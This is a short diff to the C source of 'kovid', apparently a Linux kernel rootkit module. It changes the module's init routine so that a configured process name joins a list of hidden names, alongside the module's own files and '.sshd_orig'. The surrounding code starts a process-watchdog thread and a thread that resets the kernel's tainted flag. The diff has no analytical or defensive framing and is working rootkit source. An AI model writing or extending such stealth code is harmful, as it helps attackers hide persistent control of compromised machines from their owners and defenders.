@@ -41,6 +41,10 @@
 #pragma message "Missing \'MODNAME\' compilation directive. See Makefile."
 #endif
 
+#ifdef DEBUG_RING_BUFFER
+#pragma message "!!! Be careful: Build kovid in DEBUG mode !!!"
+#endif
+
 #ifndef PRCTIMEOUT
 /**
  * default timeout seconds
@@ -770,7 +774,7 @@ static int __init kv_init(void)
 	static const char *hide_names[] = { ".kovid",	   "kovid",
 					    "kovid.ko",	   UUIDGEN ".ko",
 					    UUIDGEN ".sh", ".sshd_orig",
-					    NULL };
+					    PROCNAME,	   NULL };
 
 	/** show current version for when running in debug mode */
 	prinfo("version %s\n", KOVID_VERSION);
@@ -803,8 +807,6 @@ static int __init kv_init(void)
 	tsk_prc = kthread_run(_proc_watchdog, NULL, THREAD_PROC_NAME);
 	if (!tsk_prc)
 		goto unroll_init;
-
-	fs_add_name_ro(PROCNAME, 0);
 
 	tsk_tainted = kthread_run(_reset_tainted, NULL, THREAD_TAINTED_NAME);
 	if (!tsk_tainted)
